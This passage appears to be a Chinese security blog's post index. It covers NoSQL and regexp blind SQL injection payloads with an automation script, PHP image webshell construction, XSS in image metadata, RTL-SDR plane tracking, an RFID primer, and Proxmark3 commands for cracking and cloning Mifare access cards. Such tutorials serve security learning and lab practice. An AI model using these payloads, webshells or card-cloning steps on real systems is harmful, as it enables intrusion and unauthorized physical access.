后端。\n布尔型盲注通过布尔表达式（true或false结果、0或1等）观察页面响应情况来进行注入。常见语法：\n&#123;&quot;$ne&quot;: -1&#125;&#123;&quot;$in&quot;: []&#125;&#123;&quot;$and&quot;: [ &#123;&quot;id&quot;: 5&#125;, &#123;&quot;id&quot;: 6&#125; ]&#125;&#123;&quot;$where&quot;:  &quot;return true&quot;&#125;&#123;&quot;$or&quot;: [&#123;&#125;,&#123;&quot;foo&quot;:&quot;1&quot;&#125;]&#125;site.com/page?query=term || &#x27;1&#x27;==&#x27;1site.com/page?user[$ne]=nobodysite.com/page?user=;return true\n\n可能需要尝试附加某些字符以正确终止查询：\n//%00&#x27;”一定数量的右括号或大括号，以某种组合\n\n时间盲注注入sleep函数让页面产生延时，以此判断注入语句是否执行。\n&#123;&quot;$where&quot;:  &quot;sleep(100)&quot;&#125;;sleep(100);\n\n注入示例PHP MongoDB注入PHP语言有一个特性：允许用户通过将URL参数更改为带数组括号的参数来将查询字符串数据类型更改为数组。\nhttp://test.com/page?parameter=value //normal URLhttp://test.com/page?[parameter]=value //PHP treats input as an array now\n\n攻击者可以利用这个特性，尝试在字段值中注入MongoDB运算符，如$eq（等于）、$ne（不等于）或$gt（大于）来达到永真或永假的条件进行查询。下面是一个基础的php数据库查询方法，参数值来自表单post参数：\n$query = array(&quot;user&quot; =&gt; $_POST[&quot;username&quot;], &quot;password&quot; =&gt; $_POST[&quot;password&quot;]);\n\n如果获取的参数直接用于数据库查询以检查登录凭据，通过注入操作符参数值作为数组处理：\n?username[$ne]=1&amp;password[$ne]=1\n\n后端php会将其转换为：\narray(&quot;username&quot; =&gt; array(&quot;$ne&quot; =&gt; 1), &quot;password&quot; =&gt; array(&quot;$ne&quot; =&gt; 1));\n\n这将找到用户名和密码不等于1的所有用户，这很可能是永真查询，因此可能导致攻击者绕过身份验证。\nMongoDB JavaScript注入MongoDB API通常需要BSON（二进制 JSON）数据，但允许使用一些 JSON 和未序列化的 JavaScript 表达式。\n阅读Mongodb文档可知，MongoDB允许在服务器上执行JavaScript的$where和mapReduce操作符。\n如下是检索用户名信息的示例代码：\nlet username = req.query.username;query = &#123; $where: `this.username == &#x27;$&#123;username&#125;&#x27;` &#125;User.find(query, function (err, users) &#123;    if (err) &#123;        // Handle errors    &#125; else &#123;        res.render(&#x27;userlookup&#x27;, &#123; title: &#x27;User Lookup&#x27;, users: users &#125;);    &#125;&#125;);\n\n用于检索的用户名字符串直接从请求中获取，没有进行任何过滤。假如我们注入&#39; || &#39;a&#39;==&#39;a，则后端查询结构则变为了：\n$where: `this.username == &#x27;&#x27; || &#x27;a&#x27;==&#x27;a&#x27;`\n\n查询结果总为真，实现了注入攻击。\n假设服务器存在下面的查询逻辑，用户data数据未经过滤\ndb.collection.find( &#123; $where: function() &#123;     return (this.name == $userData) &#125; &#125; );\n\n攻击者可能会向$userData参数注入如&#39;a&#39;; sleep(5000)的字符串。服务器执行的查询将是：\ndb.collection.find( &#123; $where: function() &#123;     return (this.name == &#x27;a&#x27;; sleep(5000) ) &#125; &#125; );\n\n这样将导致时间盲注。\n处于安全考虑，可以禁用JavaScript在服务器端的执行：\n\nmongod 、mongos(MongoDB 4.4开始)实例在命令行模式通过增加--noscripting参数或在配置文件中设置security.javascriptEnabled为 false可禁止在服务器运行javascript。\n\n测试工具\nhttps://github.com/Charlie-belmer/nosqli\nhttps://github.com/codingo/NoSQLMap\nhttps://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration\nhackthebox练习靶场：Mango\n\n参考\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection\nhttps://www.netsparker.com/blog/web-security/what-is-nosql-injection/\nhttps://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection\nhttps://nullsweep.com/a-nosql-injection-primer-with-mongo/\nhttps://blog.csdn.net/weixin_45527786/article/details/113805654\nhttps://nullsweep.com/nosql-injection-cheatsheet/\n\n","categories":["Web安全"],"tags":["SQL-Injection"]},{"title":"python https server","url":"/2020/05/python-https-server/","content":"生成证书：\nopenssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes\n\n开启https server\nimport BaseHTTPServer, SimpleHTTPServerimport sslhttpd = BaseHTTPServer.HTTPServer((&#x27;0.0.0.0&#x27;, 8000), SimpleHTTPServer.SimpleHTTPRequestHandler)httpd.socket = ssl.wrap_socket (httpd.socket, certfile=&#x27;./server.pem&#x27;, server_side=True)httpd.serve_forever()\n\n\n\n支持POST方法\nimport BaseHTTPServerimport SimpleHTTPServerimport cgiimport sslclass ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):    def do_POST(self):        form = cgi.FieldStorage()        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)Handler = ServerHandlerhttpd = BaseHTTPServer.HTTPServer((&#x27;0.0.0.0&#x27;, 8000), Handler)httpd.socket = ssl.wrap_socket (httpd.socket, certfile=&#x27;./server.pem&#x27;, server_side=True)httpd.serve_forever()\n\n","categories":["程序代码"],"tags":["python"]},{"title":"regexp注入","url":"/2020/09/regexp%E6%B3%A8%E5%85%A5/","content":"简介REGEXP注入，又叫盲注值正则表达式攻击，是盲注时常用方法之一，原理是直接查询数据，通过正则表达式进行匹配。如果系统过滤了&#x3D;、in、like，我们可使用regexp注入。\n表达式形式：\nselect (select语句) regexp &#x27;正则&#x27;\n\n若匹配则返回1，不匹配返回0。例：\nselect (select username from users where id=1) regexp &#x27;^a&#x27;;\n\n^表示pattern(模式串)的开头。即当匹配到username字段下id&#x3D;1的数据开头为a时，返回1；否则返回0。如果^被过滤，可使用$从后往前匹配。\n常用regexp正则语句：\nregexp &#x27;^a&#x27;      #判断第一个字符串是否为aregexp &#x27;^[a-z]&#x27;  #判断一个表的第一个字符串是否在a-z中regexp &#x27;^r[a-z]&#x27; #判断一个表的第二个字符串是否在a-z中\n\n\n\n在联合查询中的使用\n1 union select 1,database() regexp &#x27;^s&#x27;,3 --+\n\n\n\nREGEXP盲注在sqli-labs靶场Less-8关进行测试\n1.判断数据库长度\n&#x27; or (length(database())=8)--+ 正常\n\n2.判断数据库名\n&#x27; or database() regexp &#x27;^s&#x27;--+ 正常&#x27; or database() regexp &#x27;y$&#x27;--+ 正常\n\n\n\n写个脚本批量跑\nimport requestsimport stringstrs = string.printableurl = &quot;http://x.x.x.x:8001/Less-8/index.php?id=&quot;database1 = &quot;&#x27; or database() regexp &#x27;^&#123;&#125;&#x27;--+&quot;table1 = &quot;&#x27; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;cloumn1 = &quot;&#x27; or (select column_name from information_schema.columns where table_name=\\&quot;users\\&quot; and table_schema=database() limit 1,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;data1 = &quot;&#x27; or (select username from users limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;payload = database1if __name__ == &quot;__main__&quot;:    name = &#x27;&#x27;    for i in range(1,40):        char = &#x27;&#x27;        for j in strs:            payloads = payload.format(name+j)            urls = url+payloads            r = requests.get(urls)            if &quot;You are in&quot; in r.text:                name += j                print(j,end=&#x27;&#x27;)                char = j                break        if char ==&#x27;#&#x27;:            break\n\n\n\nlike匹配百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。\n# 判断第一个字符是否为sunion select 1,database() like &#x27;s%&#x27;,3 --+# 判断前面两个字符串是否为seunion select 1,database() like &#x27;se%&#x27;,3 --+# 判断是否包含se两个字符串union select 1,database() like &#x27;%se%&#x27;,3 --+# 判断是否为5个字符union select 1,database() like &#x27;_____&#x27;,3 --+# 判断第一个字符是否为sunion select 1,database() like &#x27;s____&#x27;,3 --+\n\n\n\n\n\n参考https://blog.csdn.net/qq_43625917/article/details/105189912\n","categories":["Web安全"],"tags":["SQL Injection"]},{"title":"制作图片Webshell的方法","url":"/2019/12/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87webshell%E7%9A%84%E6%96%B9%E6%B3%95/","content":"工具\n一张正常图片：pic.png\n一句话Webshell：1.php\n\n一句话Webshell内容以下面的代码为例：\n&lt;?php @eval($_POST[1]);?&gt;\n\n\n通用方法使用十六进制编辑器直接把一句话Webshell代码粘贴到图片尾部，一定要用十六进制编辑器。\n记事本右键打开图片，直接在末尾写入一句话Webshell。这种方式也能制作，但是这种方式会破坏图片的正常显示，并且制作的图片Webshell在使用过程中会有一些问题，菜刀能连但是经常会报错，不建议采用这种方法。\nWindowscopy /b pic.png + 1.php /a shell.png\n\n\n\nLinux&#x2F;Macconvert命令可以对图像的格式和大小等进行转换，该功能由ImageMagick提供\n# 安装convert命令sudo apt-get install imagemagickbrew install imagemagickapt-get install exiftool\n\n\n\n\n\nconvert -size 100x100 -comment &#x27;&lt;?php eval($_GET[&quot;cmd&quot;]); ?&gt;&#x27; rgba:/dev/urandom[0] shell.png为一个图片生成图片马exiftool poc.jpg -documentname=&quot;&lt;?php echo exec(\\$_POST[&#x27;cmd&#x27;]); ?&gt;&quot;\n\n\n\n类似XSS图片\nconvert xss.png -set &#x27;Copyright&#x27; &#x27;/&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#x27; -set &#x27;Title&#x27; &#x27;/&gt;&lt;script&gt;alert(2);&lt;/script&gt;&#x27; -set comment &#x27;/&gt;&lt;script&gt;alert(3);&lt;/script&gt;&#x27; xssout.png弹框顺序：3，1，2\n\nhttps://www.pentestpartners.com/security-blog/from-png-text-to-persistent-xss/\nhttps://www.freebuf.com/articles/web/167843.html\n注意事项1.图片Webshell的使用，关键是服务器要把图片文件解析成脚本去执行，不能直接使用菜刀等工具连。常用方式：\n\n利用文件解析漏洞\n使最终上传的文件是php文件\n使用特殊字符使文件解析成php执行\n\n\n用文件包含页面包含执行图片Webshell\n覆盖重写服务器配置文件：.htaccess\n\n2.如果菜刀无法正常连接图片Webshell，可以多试几个不同版本的菜刀，或者试试其他工具如蚁剑。\n","categories":["攻防渗透"],"tags":["Webshell"]},{"title":"Kali下利用rtl-sdr跟踪飞机路线","url":"/2016/10/kali%E4%B8%8B%E5%88%A9%E7%94%A8rtl-sdr%E8%B7%9F%E8%B8%AA%E9%A3%9E%E6%9C%BA%E8%B7%AF%E7%BA%BF/","content":"环境kali rolling\n状态：未升级发行版，仅用 “apt-get upgrade “ 命令更新了软件\n原料\nRTL-SDR电视棒一个，芯片是RTL2832U\n\n原理飞机飞行期间，机载ADS-B通信设备会发出ADS-B信息（主要包含经度、纬度、高度和时间），让地面或其他飞机可以得知它的状态，通信频率为1090MHz，且处于救援等因素考虑，无线电信号未加密。电视棒（RTL2832U+R820T）接收的频率范围为 24 ~ 1766 MHz，因此捕获1090MHz的频率即可得知经过上空的飞机的一些状态信息。\n 一. 使用dump1090\n步骤\n安装librtlsdr-dev\nsudo apt-get install librtlsdr-dev\n\n(否则编译dump1090时会报如下错误)\n\n编译dump1090\ngit clone https://github.com/antirez/dump1090.gitcd dump1090make\n\n\n如果没法编译，可能需要安装如下依赖：\napt-get install libusb-1.0-0-dev\n\n使用dump1090\n把rtl-sdr电视棒接入电脑\n查看设备：lsusb\n\n进入dump1090所在目录\n./dump1090 --interactive --net\n\n\nHEX:　　　　　  16进制数据Flight:　　　　 航班号Altitude:　　  飞行高度（海拔）Speed：　　　　 飞行速度Lat/Lon：　　　 地理坐标（经纬度数）\n\n打开浏览器，输入localhost:8080可以查看地图显示情况（需要先翻Q）\n\n\n 搜索航班号，查看详细信息： https://flightaware.com/live/flight/\n补充\n\n航空导航通讯： 116-136MHz\n我国民航使用的无线电频率：1090MHz\n民用对讲机使用的无线电频率：408-409MHz\n警用频率：350-390MHz\n路由器\n频率：2.4GHz、5GHz  \n双频路由：2.4G&amp;5GHz\n\nWindows下类似，可以参考\nhttp://sonicgoose.com/using-dump1090-in-windows/\n参考https://ferrancasanovas.wordpress.com/cracking-and-sniffing-gsm-with-rtl-sdr-concept/\nhttp://www.freebuf.com/articles/wireless/77819.html \n","categories":["Wireless"],"tags":["SDR"]},{"title":"RF-RFID-NFC简介","url":"/2020/09/rf-rfid-nfc%E7%AE%80%E4%BB%8B/","content":"前言电流变化可以产生磁场，磁场变化可以产生电流。变化的电场和磁场构成了一个统一且不可分离的场，即电磁场，电磁场在空间运动时便会产生电磁波。\n电磁波的频率即振荡电流的频率，在电磁波频率低于100kHz时，电磁波会被地表吸收，不能形成有效的传输。当电磁波频率高于100kHz时，电磁波可以在空气中传播，并经大气层外缘的电离层反射，形成远距离传输能力。我们把具有远距离传输能力的高频电磁波称 (20kHz～300GHz) 为射频 (RF)。    —摘自百度百科。\n低于20khz的信号是音频或AF信号，频率大于20khz的信号是无线电频率或射频信号\n射频技术在无线通信领域中被广泛使用。\n更多介绍：永不消逝的电波（一）：无线电入门篇\n电磁波根据波长的大小，分为短波、中波、长波、微波、红外线、可见光、紫外线、Χ射线、γ射线等。频率在数百千赫兹到数百兆赫兹之间的电磁波叫做无线电波，它包括短波、中波、长波、微波，无线电波仅仅是电磁波的一部分，但电磁波不仅仅只有无线电波，仅仅只有频率相对较低的一部分电磁波才叫无线电波。\n无线电波或射频波是指在自由空间（包括空气和真空）传播的电磁波，其频率 3000GHz 以下 ，按波长的长短分为极长波、超长波、特长波、甚长波、长波、中波、短波、超短波、微波等。微波是指频率为300MHz300GHz的电磁波，是无线电波中一个有限频带的简称，即波长在1毫米1米之间的电磁波，是分米波、厘米波、毫米波的统称。微波频率比一般的无线电波频率高，通常也称为“超高频电磁波”。\n微波  MW（Micro Wave）  300MHz ~ 300GHz  \n无线电波传播分为三种途径：天波、地波、微波\nMicrowave：300 GHz – 300 MHz\nRadio：300 GHz – 300 MHz\nRF射频（Radio Frequency，RF）是一种高频交流变化的电磁波，即我们通常所说的无线电，其频率范围是3kHz~300GHz。射频信号的频率范围称为无线电频谱。在实际应用中，无线电频谱如下表所示：\n\n\n\n类型\n缩写\n频率范围\n典型应用频率\n示例应用\n\n\n\n甚低频\nVLF（Very Low Frequency）\n3kHz - 30KHz\n\n\n\n\n低频\nLF  （Low Frequency）\n30kHz ~ 300kHz\n125kHz，133kHz\nRFID、导航、AM长波广播\n\n\n中频\nMF（Medium Frequency）\n300 kHz - 3 MHz\n\nAM中波广播，业余广播\n\n\n高频\nHF （High Frequency）\n3MHz ~ 30MHz\n13.56MHz\n短波广播；RFID\n\n\n甚高频\nVHF（Very High Frequency）\n30 MHz - 300 MHz\n\nFM，电视节目，地对飞机和飞机对飞机通信\n\n\n极高频\nUHF（Ultra High Frequency）\n300 MHz - 3 GHz\n860MHz～960MHz\n电视广播，微波炉\n\n\n超高频\nSHF（Super High Frequency）\n3 GHz - 30 GHz\n2.45GHz，5.8GHz\n射电天文学，无线局域网\n\n\n极高频\nEHF（Extremely High Frequency）\n30 GHz - 300 GHz\n\n射电天文学，微波遥感\n\n\n\n\n\n\n潜艇通信\n\n\n其中，根据工作频率，RF主要可分为低频(LF)、高频(HF)、超高频(UHF)、微波(MW) 。\n目前在实际应用中，比较常用的是13.56MHz、860MHz～960MHz、2.45GHz等频段。近距离RFID系统主要使用125KHz、13.56MHz等LF和HF频段；远距离RFID系统主要使用433MHz、860MHz～960MHz等UHF频段，以及2.45GHz、5.8GHz等微波频段，目前多在测试当中，没有大规模应用。\n无线射频技术是指利用30~3000MHz（频率范围的定义可能不同）的电磁波实现信息和能量传输的技术总称。从应用领域看，无线射频技术主要用于信息传递，例如现在的移动通信（手机），无线互联网（WiFi），雷达等。作为能源应用，最常见的就是加热用（如家用微波炉）。另外，在高能物理加速器和医疗设备（如核磁共振）中也要用到射频功率源\nRFIDRadio Frequency Identification（RFID），射频识别，俗称射频标签、电子标签，是一种广泛使用的自动识别技术，通过无线射频方式进行非接触双向数据通信。RFID使用专用的RFID读写器及专用RFID标签，利用频率信号将信息由RFID标签传送至RFID读写器，通过无线电信号识别特定目标并读写相关数据。RFID(射频识别）是应用射频技术进行近距离无线识别的一种技术，属于射频技术的一具体应用。应该说RFID涉及到到RF(射频)技术。\nRFID应用：服装标签、门禁控制、身份证、进出停车场\nNFC Near Field Communication（NFC）近场通信，NFC通常在几厘米的距离内工作。近场通信（NFC）是智能手机和类似设备通过相互触摸或紧密靠近以彼此之间建立无线电通信的一套标准与射频卡进行通讯的技术，叫做近场通讯技术，简称NFC。\nRFID应用：手机支付、手机刷卡\nRFID与NFC的区别NFC是在RF射频技术的基础上发展而来，NFC从本质上与RF射频技术没有太大区别，都是基于地理位置相近的两个物体之间的信号传输。\nRFID安全性较弱，因为它不使用加密。NFC是RFID的在某种程度上更安全，它使用加密来确保数据安全。与RF射频技术相增加了点对点通信功能，可以快速建立蓝牙设备之间的P2P（点对点）无线通信，NFC设备彼此寻找对方并建立通信连接。P2P通信的双方设备是对等的，而RF射频技术通信的双方设备是主从关系。 \nRFID是射频识别技术，它主要是通过无线电讯号识别特定目标，并可读写数据，但仅仅是单向的读取。RFID有低频（几mm的传输距离）、高频（13.56Mhz）、超高频、微波频段等，频段不同，导致功率不同，导致传输的距离不同。NFC是近距离无线通讯技术，芯片具有相互通信能力，并有计算能力。NFC可以看作是RFID的子集，用的是RFID的高频（13.56MHz）的标准，但却是双向过程。\nRFID与NFC都属于无线通信技术，NFC的应用针对移动性的特点，用于识别和数据交换，而RFID的主要侧重于识别。\n\n\n\n\nRFID\nNFC\n\n\n\n频率\n低、高、超高\n高频（13.56MHz）\n\n\n通信距离\n长短距离均可通信\n短距离（几毫米、几厘米）\n\n\n通信方向\n单向读取\n双向读写\n\n\n能耗\n高\n低\n\n\n主要作用\n识别\n识别、数据交换\n\n\n应用领域\n身份证、资产管理、物品识别（物流、零售，UHF）\n门禁、公交卡、手机支付等\n\n\nRFID卡RFID射频标签分为低频标签（125KHz）和高频标签（13.56MHz）。\n与125 KHz的卡相比，由于频率要高得多，因此每秒可以发送的数据位数要更多。这意味着要加密的芯片上的数据将更大，从而使其更加安全。\n常见的射频标签卡从频率上可以分为高频（13.56MHZ）和低频两种类型的卡，在这两个频率上又会分为多种类型的卡。\n门禁卡（属于智能IC卡）主要是如下几种卡：EM卡、M1卡、TM卡和CPU卡等等。IC卡:集成电路卡，是继磁卡之后出现的又一种新型信息工具。在有些国家和地区也称智能卡(smart card)、智慧卡(intelligent card)、微电路卡(microcircuit card)或微芯片卡。目前IC卡已经十分广泛地应用于包括金融、交通、社保等。IC卡中有一种只读卡（只能通过读卡器读出卡号（ID号），而且卡号是固化（不能修改）的，不能往卡的分区再写数据，这种非接触卡我们把它称为IC卡。\n\n\n\n常见的卡的有:\n\n\n\n\n低频\n高频\n\n\n\n频率\n125KHz、134kHz\n13.56MHz\n\n\n读取距离\n&lt; 1米\n&lt; 1米\n\n\n\n\n\n\n\n卡片分类\nID卡、T5577卡\nIC卡、M1卡\n\n\n UID 卡的是国产的特殊卡片。这种产品是生产厂家并没有按照规范来固化卡片ID，因此在出厂后还能重复修改卡片 ID。（M1 UID卡、FUID卡、CUID卡）\n各种卡简介\n\n\n\n类型\n简称\n频率\n特性\n应用\n\n\n\nMifare UltraLight\nM0卡\n高频\n固化UID，可储存修改数据\n地铁卡，公交卡\n\n\nMifare S50\nM1卡\n高频\n最常见，每张卡有唯一的UID号，可保存修改数据\n学生卡，饭卡，公交卡，门禁卡\n\n\nMifare UID\nUID卡\n高频\nM1卡的变异版，可修改UID，国外叫中国魔术卡\n可用于克隆M1 S50的数据\n\n\nEM4XX\nID卡\n低频\n常用固化ID卡，出厂固化ID，只能读不能写\n低成本门禁卡，小区门禁卡，停车场门禁卡\n\n\nT5577\n可修改ID卡\n低频\n出厂为空卡，内有三区也可储存数据，个别三区可设置密码\n可用于克隆ID卡\n\n\nHID ProxⅡ\nHID卡\n低频\n美国常用低频卡，可擦写\n\n\n\n\n\n\n\n\n\n\nMifare Classic EV1官网介绍：MIFARE Classic®\n更多MIFARE卡介绍可参考wiki\nMIFARE Classic是飞利浦下属子公司NXP恩智浦公司的产品，属于IC卡的一种，由于成本低廉也是目前在中国场上广泛使用，使用场景包括且不限于门禁卡、饭卡、水卡等。MIFARE Classic工作频率在是13.56MHz，符合 ISO&#x2F;IEC 14443 Type A 标准（国内二代身份证是 Type B），有数据存储空间并可反复擦写数据，数据读写都需要密码验证。Mifare Classic EV1是该系列产品代表，且只有该系列，简称M1卡，其中包含S50及S70两种型号。国内采用的多数是 Mifare Classic 1k（S50）。\nMifare Classic EV1（M1）卡提供1Kb和4Kb的存储空间。常见的M1卡一般是1KB，即MIFARE Classic 1K。\nM1卡（1K）共有16 个扇区，编号015，每个扇区划分了4个块（编号03），每个块可存储16字节的数据。因此，每个扇区的存储空间大小为：4*16=64 bytes。一共有16个扇区，因此总空间就是：16*64=1024 bytes，1K即1024字节。因此叫做 MIFARE Classic 1K。如果是4K的话，就是64个扇区。\nWiki 上有M1芯片布局图：MiFare Byte Layout.png。\n每张卡的第一个扇区的第一个块（即0扇区0块）用于存储厂商数据，包括卡片 ID（完整官方名称叫Unique Identifier，UID，注意不要和后文的UID 卡弄混）和类型信息，出厂之后就不允许修改。 中国魔术卡UID除外。\n每个扇区的最后一个块用于设置A、B两个密钥和控制访问权限的 Access Conditions值。\n除了0扇区0块，其他每个扇区的前3个块都用来存储数据。\nReference\nRFID Technologies – LF, HF, UHF, BLE, NFC and Active\nA 2018 practical guide to hacking NFC&#x2F;RFID\nHacking Mifare Classic Cards\nhttps://zhuanlan.zhihu.com/p/67532665\n\n","categories":["Wireless"],"tags":["NFC"]},{"title":"Proxmark3 NFC Attack","url":"/2020/01/proxmark3-nfc-attack/","content":"环境准备 Proxmark3，支持各种高低频卡，可通过配套软件实现破解、嗅探、模拟、复制等功能，被誉为 RFID 界的瑞士军刀。\n安装Proxmark3环境https://github.com/Proxmark/proxmark3/wiki/Kali-Linux\n Install the Proxmark3 on Kali Linux\n# kali$ sudo apt-get install git build-essential libreadline5 libreadline-dev gcc-arm-none-eabi libusb-0.1-4 libusb-dev libqt4-dev ncurses-dev perl pkg-config libpcsclite-dev pcscd# ubuntusudo apt install p7zip git build-essential libreadline5 libreadline-dev libusb-0.1-4 libusb-dev libqt4-dev perl pkg-config wget libncurses5-dev gcc-arm-none-eabi libstdc++-arm-none-eabi-newlib libpcsclite-dev pcscd# Install Proxmark3git clone https://github.com/Proxmark/proxmark3.gitcd proxmark3make clean &amp;&amp; make all\n\n\n\n确认Proxmark3工作状态把PM3连接上，查看是否已经识别设备\n$ lsusbBus 001 Device 002: ID 0e0f:000b VMware, Inc. Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hubBus 002 Device 005: ID 9ac4:4b8f J. Westhues ProxMark-3 RFID Instrument$ sudo dmesg | grep -i usb | grep proxmark......[ 2836.850296] usb 4-2.4: Product: proxmark3[ 2836.850297] usb 4-2.4: Manufacturer: proxmark.org[ 2836.853857] cdc_acm 4-2.4:1.0: ttyACM0: USB ACM device\n\n正常工作状态下，PM3应该只显示白色灯。\n如果连接时亮橘红色和绿色灯，或插入系统时检测不到设备(没反应)，可能需要更新CDC Bootloader。\n操作步骤：\n\n拔掉USB线，让PM3 断电。\n然后按住PM3侧边的按钮不放，USB插入电脑，此时应该可以检测到设备了。\n继续按着不放，在&#x2F;dev下找到PM3设备串口。kali中应该是&#x2F;dev&#x2F;ttyACM0\n重刷CDC Bootloader\n\n# CDC Bootloadercd proxmark3/clientsudo ./flasher /dev/ttyACM0 -b ../bootrom/obj/bootrom.elf\n\n重刷完CDC Bootloader之后，系统应该能正常识别PM3了。\n\n更新固件Firmware\n\n继续按住按钮不放，执行下面的命令：\ncd proxmark3/clientsudo ./flasher /dev/ttyACM0 ../armsrc/obj/fullimage.elf\n\n\n\n设备状态正常的情况下，执行下面的命令进行proxmark3工具的命令交互界面\nsudo ./proxmark3 /dev/ttyACM0\n\n查看下PM3设备的基本状态\n# 查看状态proxmark3&gt; hw status （hw sta）# 查看固件版本proxmark3&gt; hw version（hw ver）# 测试电压proxmark3&gt; hw tuneMeasuring antenna characteristics, please wait........          # LF antenna: 22.27 V @   125.00 kHz          # LF antenna: 31.76 V @   134.00 kHz          # LF optimal: 31.76 V @   133.33 kHz          # HF antenna: 20.17 V @    13.56 MHz          Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.\n\n\n\n破解扇区密钥https://www.cnblogs.com/k1two2/p/5706516.html\nhttps://blog.csdn.net/qq_37806908/article/details/95992392\n出厂默认密钥M1卡出厂时使用统一的默认密钥，密钥A和密钥B的值均为FFFFFFFFFFFF，控制位为FF087069，也有一部分制造商使用自己的简单密钥作为出厂密钥。发卡商为了便利通常使用厂家提供的默认密钥，或者仅仅将包含重要数据的扇区修改密钥。对M1卡的扇区进行默认密钥扫描有助于我们提高破解的效率，并且可用来判断该卡是否为全加密卡，若未扫描到默认密钥则直接使用嗅探手段获取密钥。\n使用hf mf chk *4 ? t命令开始扫描，该命令使用12个全球通用的默认密钥扫描0-39扇区，若事先知道所用数据在多少扇区及对应的密钥类型，可以修改指令来缩短扫描时间。扫描大概需要1分钟时间，完成后可以看到除了10-15扇区外其他扇区的密钥均为FFFFFFFFFFFF，这说明10-15扇区存放了一卡通的关键数据，这6个扇区就是后续数据分析研究的重点对象。\nproxmark3&gt; hf searchproxmark3&gt; hf 14a info#扫描所有扇区默认密钥proxmark3&gt; hf mf chk * ?#扫描0扇区A密码proxmark3&gt; hf mf chk 0 A   #扫描扇区2第7块A密码proxmark3&gt; hf mf chk 8 A#注：(中间的数字是块数，0扇区块编号0-3，1扇区块数编号4-7，2扇区块数编号8-11)\n\n\n\n密钥字典爆破# 字典爆破全扇区AB密钥proxmark3&gt; hf mf chk * ? /home/ssooking/key.txt#字典爆破全扇区A密钥proxmark3&gt; hf mf chk * A /home/ssooking/test.txt#字典爆破0扇区A密钥proxmark3&gt; hf mf chk 0 A /home/ssooking/key.txt#字典爆破2扇区B密钥proxmark3&gt; hf mf chk A /home/ssooking/key.txt\n\n\n\nDark-Side Attack（仅适用于Weak Prng）\nproxmark3&gt; hf mf mifare\n\n\n\nNested Authentication Exploit（仅适用于Weak Prng）\n#已知某密钥的情况下执行NESTED攻击进行嵌套攻击，枚举&amp;爆破key:#＃使用已知密钥运行嵌套攻击proxmark3&gt; hf mf nested 1 [sector] [key_A/B] [known_key_val]proxmark3&gt; hf mf nested 1 0 A ffffffffffff\n\n也可以使用mfoc或者mfuck等工具破解某个扇区的密钥\n验证key是否正确# 测试⼀下我们拿到的密钥对不对，错误不会返回Found valid key:[xxxxx]proxmark3&gt; hf mf chk 0 A ffffffffffffproxmark3&gt; hf mf chk 0 ? ffffffffffff\n\n\n\n读取加密扇区数据All of a sudden we have a new key: 080808080808. This key allows us to read our secret blocks:\nproxmark3&gt; hf mf rdbl 5 A 080808080808#写入区块内容hf mf wrbl 5 A 080808080808 32110000cdeeffff3211000005fa05fa \n\n\n\n克隆卡片\n使用上面的方法破解出卡密钥\n\n导出加密区密钥（获取全扇区秘钥）\n\n\nproxmark3&gt; hf mf nested 1 0 A xxxxxxxxx dproxmark3&gt; hf mf nested 1 0 A ffffffffffff d#此时会输出文件dumpkeys.bin\n\n3.导出卡数据\n#参数：1=1K(default), 2=2K, 4=4Kproxmark3&gt; hf mf dump 1\n\n4、写入数据到空白卡\nproxmark3&gt; hf mf restore 1\n\n\n\n或者或者先处理导出数据文件的格式，将dumpdata.bin这个二进制文件转换成eml格式的文本信息。PM3自带dumptoemul.lua脚本进行处理。处理完后会生成eml文件。此外也可以使用python或perl脚本处理\nproxmark3&gt; hf mf dump\t\t\t\t#输出文件dumpdata.binproxmark3&gt; script run dumptoemul.lua...Wrote an emulator-dump to the file 54CDBDD1.eml#script run dumptoemul -i dumpdata.bin\n\n写入数据到空白卡\nproxmark3&gt; hf mf eclr\t\t\t\t\t\t\t #清除仿真内存的各区块数据proxmark3&gt; hf mf eload 54CDBDD1    #加载Mifare标签转储数据到内存中proxmark3&gt; hf mf cload 54CDBDD1\t\t #将卡的dump数据写入空白卡\n\n\n\n修改卡UIDCracking Mifare Classic 1K Cards\nproxmark3&gt; hf 14a infoproxmark3&gt; hf mf csetuid 798BBB39 0004 08\n\n\n\n克隆HID卡proxmark3&gt; lf search...HID Prox TAG ID: 2004263f88 (8132) - Format Len: 26bit - FC: 19 - Card: 8132  Valid HID Prox ID Found! # EM410Xlf em 410xread\n\n\n\n\n\n嗅探通信如果卡片不存在弱RNG问题，唯一可行的破解密钥的方法就是抓取分析握手包。\n\n识别读卡器上的Classic 1K卡：\n\nhf 14a reader\n\n\nProxmark3有一个嗅探模式可以记录和转储所有的RFID通信，设置PM3进入嗅探模式：\n\nhf 14a snoop\n\n\n开始嗅探数据\nhf mf sniff\n\nProxmark3在传输期间必须非常靠近两个设备，完成刷卡后，应按Proxmark3中的按钮停止嗅探。\n\n将嗅探模式捕获的数据打印到终端显示\n\n\nproxmark3&gt; hf list 14a例子：proxmark3&gt; hf 14a snoop#db# cancelled by button#db# COMMAND FINISHED#db# maxDataLen=4, Uart.state=0, Uart.len=0#db# traceLen=3179, Uart.output[0]=000000cbproxmark3&gt; hf list 14aRecorded Activity (TraceLen = 3179 bytes)Start = Start of Start Bit, End = End of last modulation. Src = Source of Transferiso14443a - All times are in carrier periods (1/13.56Mhz)iClass    - Timings are not as accuratexxxx\n\n捕获的数据中如果有感叹号表示位读取错误，可能需要读取多次才能捕获到完整的且没有任何错误的握手包，此时可以获取到提取密钥所需的UID、NT、NR、AR、AT等值。\n\n在捕获到符合条件的握手包后，提取握手包中的有效密钥\n\n./tools/mfkey/mfkey64 [CARD_UID] [NT] [NR] [AR] [AT]./tools/mfkey/mfkey64 9c599b32 82a4166c a1e458ce 